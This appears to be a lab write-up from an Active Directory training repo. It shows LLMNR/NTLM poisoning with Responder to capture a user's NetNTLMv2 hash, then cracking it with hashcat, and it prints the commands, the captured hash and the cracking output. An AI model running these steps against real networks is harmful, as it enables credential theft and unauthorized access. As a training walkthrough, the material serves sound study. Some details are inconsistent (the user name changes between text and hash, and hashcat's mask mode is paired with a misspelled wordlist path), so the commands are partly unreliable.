# NTLM ATTACK
The **New Technology LAN Manager** (**NTLM**) is pack of protocols to auth devices in windows systems. It works on challenge-response method, which provides not password but hash.
**NTLM POISONING** attack sending **CHALLENGE_MESSAGE** to pc, which trying to use SMB sharing for example. and listen for **AUTHENTICATE_MESSAGE**, which contains DOMAIN, USERNAME and PASSWORD_HASH. 
# TRAINING
To get user credentials, we'll use kali linux machine with **responder** software. 
> FROM GITHUB: Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.
> https://github.com/SpiderLabs/Responder

responder have a lot of features, which help us do much more than just poison NTLM traffic. It can provide an MSSQL, HTTPS, LDAP, and SMB auth server to us. For now, we start it to posion NTLM. 
For first step we turn our kali machine on and start responder with next command:
>``responder -I eth2 -wrd``

it loads in CLI and starts to listen for **NEGOTATE_MESSAGE** from computers. Let's help it a little. user SUIKA want to get some file in domain shared folder and she made a typo in NETBIOS name: \\\domain-exploi**i**t\inetpub. It causes her PC search for computer with wrong NETBIOS, and it should say, that no such computer with this name. But with a responder on the network, SUIKA see login prompt. whatever what's going next, we as pentesters get her credentials:
> SIBUKI::EXPLOITABLE:81cff35c5b401072:e39cce3e34bbb0393c1d66345fc11fc4:0101000000000000c5f86ee400acdc01af71ffc566e494cb0000000002000800470058005a004f0001001e00570049004e002d004300520043004b00350051005400490050003800500004001400470058005a004f002e004c004f00430041004c0003003400570049004e002d004300520043004b0035005100540049005000380050002e00470058005a004f002e004c004f00430041004c0005001400470058005a004f002e004c004f00430041004c000800300030000000000000000000000000200000c067e47a5a9f8fdde852018166a3163c40d11c9e50f5c32405063ccca984e6e70a001000000000000000000000000000000000000900280048005400540050002f0064006f006d00610069006e002d006500780070006c006f006900690074000000000000000000

But... why is this happend? because of LLMNR. 
LLMNR is Microsoft developed protocol to resolve names without DNS server. if DNS fails, computer send `who knows about domain-exploiit?` to all computers. LLMNR trusts all answers, so we can prefer **Man-In-The-Middle(MITM)** attack.
> See full output of responder on attacker machine in [responer_output.txt](https://github.com/ProRe1xxmu/AD-TRAINING/blob/main/NTLM/responder_output.txt)

after getting all what we need, we can crack this password with **hashcat**
> FROM GITHUB: **Hashcat** is a password recovery tool. It had a proprietary code base until 2015, but was then released as open source software. Versions are available for Linux, macOS, and Windows. Examples of hashcat-supported hashing algorithms are MD hashes, MD4, MD5, SHA-family and Unix Crypt formats as well as algorithms used in MySQL Cisco PIX
> https://hashcat.net/hashcat/

start hashcat with next parameters and wait wof it recover password:
> `hashcat -a 3 -m 5600 hash.txt /usr/share/wrds/rockyou.txt`
and hashcat sucessfully restored it!(because password was in wordlist)


```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SIBUKI::EXPLOITABLE:81cff35c5b401072:e39cce3e34bbb0...000000
Time.Started.....: Thu Mar  5 17:52:20 2026 (0 secs)
Time.Estimated...: Thu Mar  5 17:52:20 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Mask.......: cyb3rSec [8]
Guess.Queue......: 176/14336793 (0.00%)
Speed.#01........:      546 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: cyb3rSec -> cyb3rSec
Hardware.Mon.#01.: Util: 28%
```
>full hashcat output in [hashcat_output.txt](https://github.com/ProRe1xxmu/AD-TRAINING/blob/main/NTLM/hashcat_output.txt)

Well that's it! we can now login into account or use it credentials to access SMB sharing or other machines!
